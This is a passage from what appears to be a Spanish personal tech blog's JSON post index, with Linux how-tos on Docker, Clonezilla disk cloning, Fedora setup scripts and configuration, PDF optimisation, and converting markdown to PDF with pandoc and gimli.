[CONTAINER_ID] httpd_mod Ver la IP de un contenedor 1 docker inspect -f \u0026#39;{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}\u0026#39; [CONTAINER_ID] login cowrie 1 2 3 docker run -dit -p 2222:2222 -p 2223:2223 -v $(pwd)/dl:/home/cowrie/cowrie/dl -v $(pwd)/log:/home/cowrie/cowrie/log ouspg/cowrie ssh root@172.17.0.2 -p 2222 ","date":"2018-10-26T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/primeros-pasos-docker/","title":"Primeros pasos Docker"},{"content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #!/bin/bash # Download GitKraken wget https://release.gitkraken.com/linux/gitkraken-amd64.tar.gz # copy the downloaded file into /opt directory cp gitkraken-amd64.tar.gz /opt/ cd /opt # Extract the Kraken into /opt directory tar -xvzf gitkraken-amd64.tar.gz # you can apply ownership for a specific user too # chown -R user:group /opt/gitkraken # Add gitkraken to PATH echo \u0026#34;export PATH=\\$PATH:/opt/gitkraken\u0026#34; \u0026gt;\u0026gt; ~/.bashrc source ~/.bashrc # sudo ln -s /usr/lib64/libcurl.so.4 /opt/gitkraken/libcurl-gnutls.so.4 sudo ln -s /usr/lib64/libcurl.so.4 /usr/lib64/libcurl-gnutls.so.4 # Create gitkraken launcher icon # download icon here: http://img.informer.com/icons_mac/png/128/422/422255.png # or here: https://drive.google.com/file/d/0B-3KQ_ohu-RFVkJyS1Zfa2NLSVE/view wget http://img.informer.com/icons_mac/png/128/422/422255.png -o gitkraken-icon.png mv gitkraken-icon.png /opt/gitkraken/ cd /usr/share/applications cat \u0026gt; gitkraken.desktop \u0026lt;\u0026lt;EOL [Desktop Entry] Name=GitKraken Comment=Git Flow Exec=/opt/gitkraken/gitkraken Icon=/opt/gitkraken/gitkraken-icon.png Terminal=false Type=Application Encoding=UTF-8 Categories=Utility;Development; EOL Fuente: github\n","date":"2018-09-14T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/instalar-gitkraken/","title":"Instalar GitKraken"},{"content":"Introducción: Configuración Inicial Clonación del Disco En este ejemplo queremos hacer una copia del disco sda en el directorio raíz del disco sdb.\nConfiguración Inicial Lo primero es seleccionar el idioma y el teclado, una vez hecho eso podemos iniciar Clonezilla de modo gráfico o en modo consola para introducir el comando a ejecutar directamente. En este caso lo haremos de forma gráfica con Start_Clonezilla.\nEn la mayoría de las ocasiones usaremos la opción device-image, ya que queremos crear una copia del disco físico en un directorio de otro disco\nSeleccionamos el modo de conectarnos con el disco en el que guardaremos la copia, en nuestro caso sera local_dev que es un disco local.\nAhora tenemos que conectar el disco al equipo en caso de que no estuviese conectado, pulsamos Enter para que escanee los discos disponibles.\nAquí veremos los discos que hay disponibles, tenemos:\nsda: disco del que queremos hacer una clonación sdb: disco donde guardaremos el disco sda Aquí vemos todas las particiones disponibles, tenemos que seleccionar el disco donde queremos que se guarde la copia, ya que se va a montar para poder acceder a los directorios, en este caso sdb1.\nSeleccionamos el directorio donde queremos que se guarde la copia, en este caso la raíz y le damos a Done.\nNos pedirá que le demos a Enter para confirmar.\nClonación del Disco Aqui podemos seleccionar el modo en el que deseamos continuar, yo usare Beginner que es mas que suficiente para hacer clonaciones de disco\nSeleccionamos savedisk ya que lo que deseamos hacer es clonar el disco no una particion.\nIntroducimos el nombre que tendrá la copia de seguridad, es aconsejable mantener la estructura: YY-MM-DD-SO-NOMBRE para una mayor claridad a la hora de revisar las copias de seguridad.\nSeleccionamos cual es el disco que queremos clonar, aquí nunca saldrá el disco que hemos montado anteriormente para guardar la copia, en este caso el disco que queremos clonar es sda.\nAquí nos empezara a pedir unas configuraciones básicas, mi recomendación es dejarlas todas por defecto, la opción por defecto es -sfsck para saltar la revisión y reparación de la copia una vez que se ha hecho.\nDespués nos preguntara si queremos comprobar si la imagen creada es restaurable, la opción recomendada es Yes, check the saved image\nIndicamos que cuando termine se apague con poweroff, ya que es un proceso largo y posiblemente no estemos cuando termine de clonarse.\nNos muestra el comando que se va a ejecutar por si queremos usarlo la próxima vez automatizando todo el proceso.\nNos muestra lo que se va a hacer y nos pide confirmación para proceder a hacer la copia.\nEmpieza el proceso de clonado de cada partición de sda en una carpeta de sdb y cuando termine apagara el equipo.\n","date":"2018-02-16T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/clonar-disco-con-clonezilla/","title":"Clonar disco con Clonezilla"},{"content":"Introducción: Configuración Inicial Restauración del Disco En este ejemplo queremos restaurar la imagen del disco sda que esta guardada en el disco sdb.\nConfiguración Inicial Lo primero es seleccionar el idioma y el teclado, una vez hecho eso podemos iniciar Clonezilla de modo gráfico o en modo consola para introducir el comando a ejecutar directamente. En este caso lo haremos de forma gráfica con Start_Clonezilla.\nEn la mayoría de las ocasiones usaremos la opción device-image, ya que queremos restaurar una imagen de un directorio a un disco.\nSeleccionamos el modo de conectarnos con el disco en el tenemos la imagen que queremos restaurar, en nuestro caso sera local_dev que es un disco local.\nAhora tenemos que conectar el disco al equipo en caso de que no estuviese conectado, pulsamos Enter para que escanee los discos disponibles.\nAquí veremos los discos que hay disponibles, tenemos:\nsda: disco en el que queremos restaurar la imagen sdb: disco donde tenemos la imagen del disco sda Aquí vemos todas las particiones disponibles, tenemos que seleccionar el disco donde tenemos la imagen que queremos restaurar, ya que se va a montar para poder acceder a los directorios, en este caso sdb1.\nSeleccionamos el directorio donde esta la imagen a restaurar, en este caso la raíz y le damos a Done. Nos pedirá que le demos a Enter para confirmar.\nRestauración del Disco Seleccionamos restoredisk ya que lo que deseamos hacer es restaurar una imagen.\nNos saldrá la lista de imágenes disponibles para restaurar en el directorio que indicamos anteriormente, en esta ocasión solo tenemos 1 disponible por lo que la seleccionamos.\nSeleccionamos cual es el disco que queremos restaurar, aquí nunca saldrá el disco que hemos montado anteriormente para guardar la copia, en este caso el disco que queremos restaurar es sda.\nAquí nos empezara a pedir unas configuraciones básicas, mi recomendación es dejarlas todas por defecto, la opción por defecto es Yes, check the image before restoring para chekear la integridad de la imagen antes de restaurarla.\nIndicamos que cuando termine se apague con poweroff, ya que es un proceso largo y posiblemente no estemos cuando termine de clonarse.\nNos muestra el comando que se va a ejecutar por si queremos usarlo la próxima vez automatizando todo el proceso y nos pide que pulsemos Enter para confirmar la operación.\nHace el checkeo de la imagen si anteriormente así lo indicamos como viene por defecto.\nNos muestra lo que se va a hacer y nos pide confirmación 2 veces.\nEmpieza el proceso de clonado de cada partición de sda en una carpeta de sdb.\n","date":"2018-02-16T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/restaurar-disco-con-clonezilla/","title":"Restaurar disco con Clonezilla"},{"content":"Para optimizar un pdf usaremos la herramienta Ghostscript tenemos 2 formas de utilizarlo: para un unico fichero o en un directorio.\nOptimizar un pdf:\noptimiza_pdf.sh fichero.pdf\nOptimizar todos los pdf que hay en un directorio:\nfind . -type f -name \u0026quot;*.pdf\u0026quot; -exec ./optimiza_pdf.sh {} \\;\n1 2 3 4 5 6 7 8 9 #!/bin/bash #Script para optimizar pdf se para como argumento el pdf # para ejecutarlo sobre un directorio find . -type f -name \u0026#34;*.pdf\u0026#34; -exec ./optimiza_pdf.sh {} \\; TEMP=\u0026#34;temporal.pdf\u0026#34; echo \u0026#34;$1\u0026#34; gs -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dNOPAUSE -dQUIET -dBATCH -sOutputFile=\u0026#34;$TEMP\u0026#34; \u0026#34;$1\u0026#34; mv \u0026#34;$TEMP\u0026#34; \u0026#34;$1\u0026#34; Puedes descargar el script pulsado aqui\n","date":"2018-01-30T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/optimizar-pdf/","title":"Optimizar PDF's"},{"content":"indice\nbasico sudo apt-get install vim encfs rsync\n#insync\n./insync-portable add_account -a \u0026ldquo;CÓDIGO_AUTORIZACIÓN\u0026rdquo; -p \u0026ldquo;RUTA\u0026rdquo;\nCódigo de autorización: es un código mediante el cual Google autoriza a Insync a acceder a tus archivos en Drive. Se obtiene en la siguiente URL: https://goo.gl/jv797S os\nhttps://miraspberrypi.wordpress.com/2016/04/24/insync-en-raspian-desde-linea-de-comando/\nexport LC_ALL=C.UTF-8 ## IMPORTANTE PARA QUE FUNCIONE descomprime_rar.py export LC_CTYPE=ISO_8859_1\nwiki python3-devel\npip3 install -r re\nOSMC instalar herramieentas desarrollo make, cmake, gcc. etc\nno tiene instalado el autocompletado de bash\nsudo apt-get install bash-completion\n","date":"2017-07-06T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/primeros-pasos-osmc/","title":"Primeros pasos OSMC"},{"content":"Introducción En esta primera parte pondré todos las librerías y programas que suelo instalar en Fedora 25, en la segunda parte haré una configuración del entorno de trabajo (fstab, crontab, .ssh, etc)\nRPMFusion Librerias basicas Compilación Compresión Codecs DVD\u0026rsquo;s Programas basicos HP Insync Pandoc Spotify Atom Visual Studio Code Skype Teamviewer Dropbox Gitkraken Pycharm Telegram Eclipse Google Chrome Google Music system-config-samba Drivers nvidia Peek Actualización inicial Lo primero que hay que hacer es actualizar el sistema y lo reiniciamos, posiblemente haya una gran cantidad de paquetes a actualizar, junto con la actualización del kernel por lo que después es bueno hacer un reinicio del sistema.\n1 2 sudo dnf update reboot Eliminar programas no necesarios 1 sudo dnf remove dragon calligra-core Añadir repositorio RPMFusion Este repositorio es necesario para varios paquetes que instalaremos después (contiene programas importantes y paquetes nonfree).\n1 sudo dnf install https://download1.rpmfusion.org/free/fedora/rpmfusion-free-release-$(rpm -E %fedora).noarch.rpm Paquetes y librerías que mas uso Conjunto de librerías y utilidades básicas, traducciones de programas a español, corrector ortográficos, etc.\n1 2 3 4 sudo dnf install kde-i18n-Spanish mythes-es hyphen-es autocorr-es hunspell-es langpacks-es \\ aspell-es man-pages-es-extra kde-l10n-es android-tools expect flac-libs \\ fluid-soundfont-common encfs samba wine curl system-config-users meld youtube-dl \\ wget iftop Java 1 sudo dnf install java-openjdk java-1.8.0-openjdk-javadoc java-1.8.0-openjdk-devel Herramientas básicas de compilación Conjunto de librerías básicas de compilación\n1 2 sudo dnf install kernel-headers kernel-devel git make libxml2 libxml2-devel mercurial \\ cmake python-devel python3-devel gcc-c++ dkms openssl-devel Compresión y descompresión Conjunto de librerías básicas de compresión y descompresión\n1 sudo dnf install p7zip p7zip-plugins zip unzip unrar Codecs Conjunto de codecs necesarios para la reproducción de audio con código privado (mp3, etc)\n1 2 3 4 5 6 sudo dnf install gstreamer gstreamer1-libav gstreamer1-plugins-bad-free-extras \\ gstreamer1-plugins-bad-freeworld gstreamer1-plugins-good-extras pavucontrol \\ gstreamer-ffmpeg gstreamer-plugins-bad gstreamer-plugins-bad-free-extras \\ gstreamer-plugins-ugly ffmpeg ffmpeg-libs libmatroska xvidcore libva-vdpau-driver \\ libvdpau libvdpau-devel gstreamer1-vaapi gstreamer1-plugins-base-tools mencoder \\ alsa-firmware gstreamer1-plugins-ugly Soporte para DVD\u0026rsquo;s Conjunto de librerías necesarias para la reproducción de DVD\u0026rsquo;s\n1 sudo dnf install lsdvd libdvbpsi libdvdread libdvdnav Programas básicos 1 2 3 sudo dnf install VirtualBox vim yakuake libreoffice libreoffice-langpack-es \\ gnome-disk-utility sqlitebrowser gimp vlc fritzing kdenlive frei0r-plugins \\ calibre picard chromaprint-tools arduino vokoscreen filezilla Dispositivos HP (impresora) 1 sudo dnf install hplip hplip-common libsane-hpaio hplip-gui Insync 1 2 3 4 5 6 7 8 9 sudo rpm --import https://d2t3ff60b2tol4.cloudfront.net/repomd.xml.key sudo echo \u0026#34;[insync] name=insync repo baseurl=http://yum.insynchq.com/fedora/\\$releasever/ gpgcheck=1 gpgkey=https://d2t3ff60b2tol4.cloudfront.net/repomd.xml.key enabled=1 metadata_expire=120m\u0026#34; \u0026gt; /etc/yum.repos.d/insync.repo sudo dnf install insync insync-dolphin Pandoc 1 2 sudo dnf install pandoc texlive texlive texlive-latex texlive-xetex texlive-xetex-def \\ texlive-collection-latexrecommended texlive-collection-xetex texlive-collection-latex Spotify 1 2 sudo dnf config-manager --add-repo=http://negativo17.org/repos/fedora-spotify.repo sudo dnf install spotify-client Atom 1 2 3 4 programa=\u0026#34;atom.x86_64.rpm\u0026#34; wget -O $programa https://atom.io/download/rpm sudo dnf -y install $programa rm $programa Visual Studio Code 1 2 3 4 sudo rpm --import https://packages.microsoft.com/keys/microsoft.asc sudo sh -c \u0026#39;echo -e \u0026#34;[code]\\nname=Visual Studio Code\\nbaseurl=https://packages.microsoft.com/yumrepos/vscode\\nenabled=1\\ngpgcheck=1\\ngpgkey=https://packages.microsoft.com/keys/microsoft.asc\u0026#34; \u0026gt; /etc/yum.repos.d/vscode.repo\u0026#39; dnf check-update sudo dnf install code Skype 1 sudo dnf install https://go.skype.com/skypeforlinux-64.rpm Teamviewer 1 sudo dnf install https://download.teamviewer.com/download/linux/teamviewer.x86_64.rpm Dropbox 1 sudo dnf install https://www.dropbox.com/download?dl=packages/fedora/nautilus-dropbox-2015.10.28-1.fedora.x86_64.rpm Gitkraken 1 2 3 4 programa=\u0026#34;gitkraken-amd64.tar.gz\u0026#34; wget -O $programa https://release.gitkraken.com/linux/gitkraken-amd64.tar.gz mv $programa ~/Programas/ \u0026amp;\u0026amp; cd ~/Programas/ tar -xvf $programa \u0026amp;\u0026amp; rm $programa \u0026amp;\u0026amp; cd - Pycharm Community 1 2 3 4 programa=\u0026#34;pycharm-community-2017.1.tar.gz\u0026#34; wget -O $programa https://download.jetbrains.com/python/pycharm-community-2017.1.tar.gz mv $programa ~/Programas/ \u0026amp;\u0026amp; cd ~/Programas/ tar -xvf $programa \u0026amp;\u0026amp; rm $programa \u0026amp;\u0026amp; cd - Telegram 1 2 3 4 programa=\u0026#34;telegram.tar.xz\u0026#34; wget -O $programa https://tdesktop.com/linux mv $programa ~/Programas/ \u0026amp;\u0026amp; cd ~/Programas/ tar -xvf $programa \u0026amp;\u0026amp; rm $programa \u0026amp;\u0026amp; cd - Eclipse 1 2 3 4 programa=\u0026#34;eclipse-inst-linux64.tar.gz\u0026#34; wget -O $programa http://mirror.ibcp.fr/pub/eclipse//oomph/epp/neon/R2a/eclipse-inst-linux64.tar.gz mv $programa ~/Programas/ \u0026amp;\u0026amp; cd ~/Programas/ tar -xvf $programa \u0026amp;\u0026amp; rm $programa \u0026amp;\u0026amp; cd - Google Chrome Descargar RPM de aqui: url\nGoogle Music Descargar RPM de aqui: url\nsystem-config-samba Descargar RPM de aqui: url\nInstalar drivers nvdia 1 https://www.if-not-true-then-false.com/2015/fedora-nvidia-guide/ Fuente: url\nPeek para grabar la pantalla y crear gif/mp4 1 2 sudo dnf config-manager --add-repo http://download.opensuse.org/repositories/home:/Bajoja/Fedora_25/home:Bajoja.repo sudo dnf install peek Sublime Text 3 1 2 3 sudo rpm -v --import https://download.sublimetext.com/sublimehq-rpm-pub.gpg sudo dnf config-manager --add-repo https://download.sublimetext.com/rpm/stable/x86_64/sublime-text.repo sudo dnf install sublime-text Url gitgub\n","date":"2017-03-30T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/primeros-pasos-fedora-27-parte-i/","title":"Primeros pasos Fedora 27 KDE Parte I"},{"content":"Introducción En esta segunda parte, haré una configuración del entorno de trabajo (fstab, crontab, .ssh, etc) y den entorno gráfico\nFicheros Fichero crontab Fichero fstab Clave privada Entorno grafico Configuración de ficheros Fichero crontab vim /etc/crontab\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 SHELL=/bin/bash PATH=/sbin:/bin:/usr/sbin:/usr/bin MAILTO=root # For details see man 4 crontabs # Example of job definition: # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed # 0 *\t* * *\tprocamora\tcd /home/procamora/ \u0026amp;\u0026amp; ./rsync_samba.sh \u0026gt;/tmp/rsync.log 2\u0026gt;\u0026amp;1 # 0 */2\t* * *\tprocamora\tcd /home/procamora/BoxCryptor/ \u0026amp;\u0026amp; ./rsync_i7.sh \u0026gt;/tmp/rsync_gdrive.log 2\u0026gt;\u0026amp;1 0 22\t* * *\tprocamora\tpython3 /home/procamora/scripts/backup.py i7_rsync.sh \u0026gt;\u0026gt; /tmp/rsync_gdrive.log 2\u0026gt;\u0026amp;1 */7 *\t* * *\tprocamora\tcd /home/procamora/Documentos/Wiki-Personal/ \u0026amp;\u0026amp; bash pushgit.sh \u0026gt;\u0026gt; /tmp/wiki.log 2\u0026gt;\u0026amp;1 Fichero fstab vim /etc/fstab\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # # /etc/fstab # Created by anaconda on Wed Mar 29 21:50:12 2017 # # Accessible filesystems, by reference, are maintained under \u0026#39;/dev/disk\u0026#39; # See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info # Particiones por defecto UUID=9c64fe32-84c5-4954 / ext4 defaults,relatime 1 1 UUID=659ee856-118a-433b /boot ext4 defaults,relatime 1 2 UUID=F6DB-090A /boot/efi vfat umask=0077,shortname=winnt 0 2 UUID=7f4fc31b-e92d-4d31 /home ext4 defaults,relatime 1 2 /dev/mapper/fedora-swap swap swap defaults 0 0 # Disco NTFS con todos los permisos + posibilidad de usar chmod UUID=EE3A29F53A29BC09 /mnt/WD_BLACK ntfs-3g permissions,locale=es_ES.utf8 0 2 # Disco de red montado por samba //192.168.1.71/DiscoUSB /mnt/DescargasPi cifs credentials=/home/procamora/.smbcredentials,iocharset=utf8,sec=ntlm 0 0 vim /home/procamora/.smbcredentials\n1 2 #username=xxxxx #password=xxxxx Clave privada COnfiguraremos tanto la clave privada para conectarnos a otros equipos sin necesidad de usar contraseña como la clave publica para que otros de nuestros equipos se conecten a nosotros con nuestra clave privada\n1 2 3 4 5 6 7 8 mkdir -p ~/.ssh touch ~/.ssh/OpenSSH vim ~/.ssh/OpenSSH # guardamos el contenido de la clave privada chmod 600 ~/.ssh/OpenSSH # le quitamos los permisos necesarios ssh-add ~/.ssh/OpenSSH # ponemos la contraseña y ya tenemos cargada la clave vim ~/.ssh/authorized_keys # guardamos el contenido de la clave publica chmod 600 ~/.ssh/authorized_keys # le quitamos los permisos necesarios chmod 700 ~/.ssh Fichero hosts vim /etc/hosts\n1 2 3 4 5 6 127.0.0.1 localhost 4770K localhost4 ::1 localhost 4770K localhost6 192.168.1.1 router 192.168.1.59 4770K 192.168.1.55 xiaomi 192.168.1.71 pi Configuración de aplicaciones con autoarranque 1 2 3 4 systemctl enable sshd systemctl enable smb systemctl enable nmb systemctl disable firewalld.service # solo en el pc de casa Fichero bashrc Poner para los usuarios: procamora, root\nvim .bashrc\n1 2 3 4 5 6 7 8 9 10 echo \u0026#39; # User specific aliases and functions alias ls=\u0026#34;ls -lhGQ --color=auto\u0026#34; alias rm=\u0026#34;echo Use trash, or the full path i.e. /bin/rm\u0026#34; alias which=\u0026#34;alias | /usr/bin/which --tty-only --read-alias --show-dot --show-tilde\u0026#34; export VISUAL=/usr/bin/vim export EDITOR=\u0026#34;$VISUAL\u0026#34; \u0026#39; \u0026gt;\u0026gt; ~/.bashrc Configuración de vim 1 2 3 4 5 6 7 8 9 10 11 12 13 14 USERS=\u0026#34;root procamora\u0026#34; # Clonamos repositorio su -c \u0026#34;git clone --depth=1 https://github.com/amix/vimrc.git /opt/vim_runtime\u0026#34; # Instalamos para los usuarios seleccionados su -c \u0026#34;sh /opt/vim_runtime/install_awesome_parameterized.sh /opt/vim_runtime $USERS\u0026#34; # Dar permiso a los ficheros para los usuarios no root su -c \u0026#34;chmod 755 /opt/vim_runtime/ -R\u0026#34; su -c \u0026#34;chown procamora:procamora /home/procamora/.vimrc -R\u0026#34; # to install for all users with home directories #sh /opt/vim_runtime/install_awesome_parameterized.sh /opt/vim_runtime --all Configuración del entorno gráfico Configuración dolphin Configuración de vistas Vamos a Control/Configurar las barras de herramientas\nAbrir tereminal Archivos ocultos Vamos a Control/Ajustar las propiedades de vista\nOrdenar por fecha Descendente Mostar archivos ocultos Aplicar a todas las carpetas Usar estas propiedades de vista como predeterminadas Configuración de accesos directos 1 2 3 4 dir=\u0026#34;/home/procamora/\u0026#34; ln -s /mnt/WD_BLACK/pablojoserocamora@gmail.com $dir # directorio google drive ln -s /home/procamora/pablojoserocamora@gmail.com/scripts/ $dir # directorio de scripts ln -s /home/procamora/pablojoserocamora@gmail.com/Musica/* /home/procamora/Música/ # Enlazo todos los discos Configuración energía Configuración de aplicaciones con autoarranque Vamos a Preferencias del sistema/Arranque y apagado/Autoarranque\n","date":"2017-03-30T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/primeros-pasos-fedora-27-parte-ii/","title":"Primeros pasos Fedora 27 KDE Parte II"},{"content":"Introducción: A la hora de crear un fichero pdf a través de un fichero markdown tenemos múltiples opciones, las mas personalizada es pandoc aunque otros conversores también son muy personalizables.\nTenemos distintos tipos de conversores de markdown a pdf:\nConversores por linea de comandos: pandoc gimli Conversores con entorno gráfico: Atom Markdown Pad Conversores Online: Cloudconvert Markdowntopdf Resumen general Conclusion final Puede asegurarse de que ciertas cosas, como las comillas y los guiones en em, se leen y formateen correctamente especificando el conmutador \u0026ldquo;Smart\u0026rdquo; (un mayúscula -S o -smart):\nConversores por linea de comandos pandoc gimli Pandoc Pandoc es una herramienta que te permite a través de un fichero markdown generar otro con múltiples formatos, como por ejemplo PDF, HTML o DOCX. Los pasos a realizar son los siguientes:\nMejora a conseguir: que cada inicio de apartado empiece en una nueva pagina\nPaso 1: Instalación. La instalación en Fedora es muy simple:\ndnf install pandoc pandoc-citeproc texlive texlive-collection-langspanish.noarch\nPaso 2: Añadir cabecera yaml al fichero markdown. Una vez instalado pandoc mas todas las librerías necesarias de texlive con latex tendremos que añadir una cabecera yaml para indicarle a pandoc una serie de directrices a la hora de generar el pdf.\nLos parámetros a tener en cuenta son:\ngeometry: modificamos la alineación aumentándola toc: Indicamos con true que queremos una tabla de contenidos documentclass: pone en negrita el texto del los metadatos, visualmente queda mejor MODIFICAR 1 2 3 4 5 6 7 8 9 10 11 12 13 14 --- title: Nombre de la practica subtitle: Asignatura author: - nombre 1 - nombre 2 date: September 6, 2016 header: dsad footer: So is this geometry: margin=1in toc: true documentclass: - scrartcl --- Paso 3: Creación del fichero plantilla de latex para poner un pagina en blanco antes de la tabla de contenidos y después. Generar la plantilla por defecto de latex, es recomendable generarla para que tenga la versión mas reciente usada por pandoc, la que yo uso es esta.\npandoc -D latex \u0026gt; plantilla.tex\nModificar la plantilla, buscando donde se crea la tabla de contenido para añadir las paginas en blanco. Fuente.\nBuscar este texto\n1 2 3 4 5 6 7 8 $if(toc)$ { $if(colorlinks)$ \\hypersetup{linkcolor=$if(toccolor)$$toccolor$$else$black$endif$} $endif$ \\setcounter{tocdepth}{$toc-depth$} \\tableofcontents } Y le añadimos los dos \\newpage para dejar la tabla de paginas en una pagina sola.\n1 2 3 4 5 6 7 8 9 10 $if(toc)$ { \\newpage $if(colorlinks)$ \\hypersetup{linkcolor=$if(toccolor)$$toccolor$$else$black$endif$} $endif$ \\setcounter{tocdepth}{$toc-depth$} \\tableofcontents \\newpage } Latex dispone de 2 tags interesantes \\newpage y \\pagebreak que nos servirán para terminar de maquetar los texto como nosotros queramos, poniendo cualquiera de los 2 tags en el fichero markdown podremos introducir un final de pagina, por lo que si los ponemos antes de cada nuevo apartado, tendremos cada apartado en una pagina diferente. Fuente\nAñadir bibliografia: hay que crear la biblioagria que tendra este formato: Fichero bibliografia.bib:\n1 2 3 4 5 6 7 8 9 10 11 12 13 @article{fenner2012a, title = {One-click science marketing}, volume = {11}, url = {http://dx.doi.org/10.1038/nmat3283}, doi = {10.1038/nmat3283}, number = {4}, journal = {Nature Materials}, publisher = {Nature Publishing Group}, author = {Fenner, Martin}, year = {2012}, month = {mar}, pages = {261-263} } Codigo del .md\n1 This is a test2 [@fenner2012a]. Despues se compilara con: pandoc --bibliography=bibliografia.bib ....\nPaso 4: Generación del pdf. Teniendo esa cabecera yaml en el fichero y generada la plantilla modificada para general el pdf con nuestro formato ya solo falta llamar al comando pandoc.\nLos parámetros a tener en cuenta son:\n\u0026ndash;template: Otros parámetros interesantes:\n\u0026ndash;number-sections: El comando final resultante seria:\n1 pandoc --template=plantilla.tex memoria.md -o output.pdf Opción 2: En ocasiones el código a mostrar tiene lineas muy largas y pandoc no las parte adecuadamente, hay una opción para hacer que markdown corte las lineas de código pero tiene ciertas desventajas como son: no resalta el código y necesita el motor de xelatex\nPara usar esta opción solo habría que añadir un nuevo parámetro a la cabecera, que sera header-includes quedando así la cabecera yaml:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 --- title: Recorrido de un paquete subtitle: Redes de Comunicaciones author: - Pablo José Rocamora Zamora ¡date: Enero 30, 2017 header: dsad footer: So is this geometry: margin=1in toc: true documentclass: - scrartcl header-includes: - \\usepackage{xcolor} - \\lstset{breaklines=true} - \\lstset{basicstyle=\\small\\ttfamily} - \\lstset{extendedchars=true} - \\lstset{tabsize=2} - \\lstset{columns=fixed} - \\lstset{showstringspaces=false} - \\lstset{frame=trbl} - \\lstset{frameround=tttt} - \\lstset{framesep=4pt} - \\lstset{numbers=left} - \\lstset{numberstyle=\\tiny\\ttfamily} - \\lstset{postbreak=\\raisebox{0ex}[0ex][0ex]{\\ensuremath{\\color{red}\\hookrightarrow\\space}}} - \\lstset{keywordstyle=\\color[rgb]{0.13,0.29,0.53}\\bfseries} - \\lstset{stringstyle=\\color[rgb]{0.31,0.60,0.02}} - \\lstset{commentstyle=\\color[rgb]{0.56,0.35,0.01}\\itshape} - \\lstset{stepnumber=1} - \\lstset{numbersep=5pt} - \\lstset{backgroundcolor=\\color[RGB]{248,248,248}} - \\lstset{showspaces=false} - \\lstset{showtabs=false} - \\lstset{captionpos=b} - \\lstset{breakatwhitespace=false} # esto hace que sea una linea son contar - \\lstset{breakautoindent=true} - \\lstset{escapeinside={\\%*}{*)}} - \\lstset{linewidth=\\textwidth} - \\lstset{basewidth=0.5em} --- Hay muchos mas parametros que podemos poner con lstset, aqui podemos ver el listado con listings muchos: url\nSi no tenemos el motor de xelatex instalado tendremos que instalarlo antes de poder usar el comando: Fuente\n1 2 3 4 [sudo] dnf install texlive texlive-latex texlive-xetex texlive-collection-latex texlive-collection-latexrecommended texlive-xetex-def texlive-collection-xetex # Instalar solo si es necesario [sudo] dnf install texlive-collection-latexextra El comando final resultante seria:\n1 pandoc --template=plantilla.tex --listings --latex-engine=xelatex memoria.md -o memoria.pdf Portada Indice tabla de contenidos resaltado de sintaxis tablas markdown Separar por pagina distintos apartados Optimización del espacio Corta lineas de cdigo largas ✔ ✔ ✔ ✔ ✔ ✔ ✔ ✔ Gimli Gimli es una herramienta para convertir ficheros markdown en pdf, esta escrita en ruby. Su instalación se hace a través del instalador de paquetes de ruby gem. Trabaja convirtiendo el markdown a html a través de github/markup y el html a pdf a través de wkhtmltopdf, por lo que gracias a wkhtmltopdf podremos hacer pdf con bastantes mejoras visuales.\nPaso 1: Instalación. En Fedora 24 viene instalado por defecto gem, así que la instalación es bastante simple:\n$ [sudo] gem install gimli\nPaso 2: Generación del pdf. Para generar un pdf con gimli, simplemente habría que usar el comando gimli -f memoria.md y generaría un fichero pdf con el mismo nombre aunque con extensión pdf, por defecto el fichero que genera es bastante feo estéticamente, pero le podemos añadir varias mejoras visuales a través de parámetros que enviamos a wkhtmltopdf directamente gracias al parámetro -w:\nGimli tiene un parámetro de configuración que es -cover portada.md que es para ponerle una portada al pdf resultante.\nParametros de wkhtmltopdf: Todos estos parámetros tienen que pasarse a través del parámetro -w de gimli para que lleguen a wkhtmltopdf, por lo que el comando seria gimli -f test.md -w 'PARÁMETROS'\nTabla de contenidos: tendremos que pasar el parámetro --toc para generar la tabla y con --toc-header-text \u0026quot;Tabla de contenidos\u0026quot; indicamos el nombre que tendra, quedando asi el comando resultante:\n1 gimli -f test.md -w \u0026#39;--toc --toc-header-text \u0026#34;Tabla de contenidos\u0026#34;\u0026#39; Pie de pagina con numero: tendremos que pasar el parámetro --footer-right \u0026quot;[page]/[toPage]\u0026quot;, aunque también podemos cambiar la posición del texto con: --footer-left \u0026quot;[page]/[toPage]\u0026quot; o --footer-center \u0026quot;[page]/[toPage]\u0026quot; quedando asi el comando resultante:\n1 gimli -f test.md -w \u0026#39;--footer-right \u0026#34;[page]/[toPage]\u0026#34;\u0026#39; Como resultado final nos quedaría este comando para generar un pdf con tabla de contenidos mas pie de pagina con el numero\n1 gimli -f test.md -cover portada.md -w \u0026#39;--toc --toc-header-text \u0026#34;Tabla de contenidos\u0026#34; --footer-right \u0026#34;[page]/[toPage]\u0026#34;\u0026#39; Portada Indice tabla de contenidos resaltado de sintaxis tablas markdown Separar por pagina distintos apartados Optimización del espacio Corta lineas de código largas ✔* ❌ ✔ ✔ ✔ ❌ ✔ ✔ * Puede generar una portada pero tiene que estar hecha en markdown y no suelen quedar muy bien visualmente.\nConversores con entorno gráfico Atom Markdown Pad Atom Atom por si mismo no tiene ningún conversor de markdown a pdf, pero tiene varios paquetes que desempeñan esa tarea con bastante calidad. El mas destacado es markdown-themeable-pdf que crea 